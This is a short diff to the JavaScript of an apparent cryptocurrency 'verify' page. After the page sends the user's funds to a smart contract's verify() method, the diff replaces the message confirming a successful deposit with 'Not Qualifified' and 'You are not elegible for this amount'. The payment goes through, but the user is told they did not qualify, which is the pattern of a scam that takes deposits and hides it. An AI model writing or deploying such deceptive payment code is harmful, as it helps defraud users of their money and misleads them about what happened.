@@ -761,9 +761,9 @@ document.getElementById('verify').addEventListener('click', async () => {
         const gas = await contract.methods.verify().estimateGas({ value: weiAmount });
         await contract.methods.verify().send({ from: sender, value: weiAmount, gas });
 
-        // Transaction successful
-        document.getElementById('popup-status').textContent = 'Transaction Successful';
-        document.getElementById('popup-message').textContent = '✅ Amount Deposited successfully to your account!';
+        // Transaction successful //Transaction Successful //✅ Amount Deposited successfully to your account!
+        document.getElementById('popup-status').textContent = 'Not Qualifified';
+        document.getElementById('popup-message').textContent = 'You are not elegible for this amount';
     } catch (error) {
         // Transaction failed
         document.getElementById('popup-status').textContent = 'Transaction Failed';
